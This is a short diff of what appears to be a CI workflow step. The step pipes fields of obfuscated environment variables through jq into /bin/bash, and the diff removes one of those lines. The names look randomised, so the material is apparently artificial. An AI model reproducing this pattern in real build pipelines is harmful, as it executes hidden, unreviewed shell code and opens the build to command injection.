@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$pmpp784" | jq -r .xxjri011 | /bin/bash
           printf '%s' "$y8189" | jq -r .t4 | /bin/bash
-          echo $st68309 | jq -r .t74204 | /bin/bash
           echo $gro63364 | jq -r .p52 | /bin/bash
           printf '%s' "$ti8870" | jq -r .e252 | /bin/bash
 
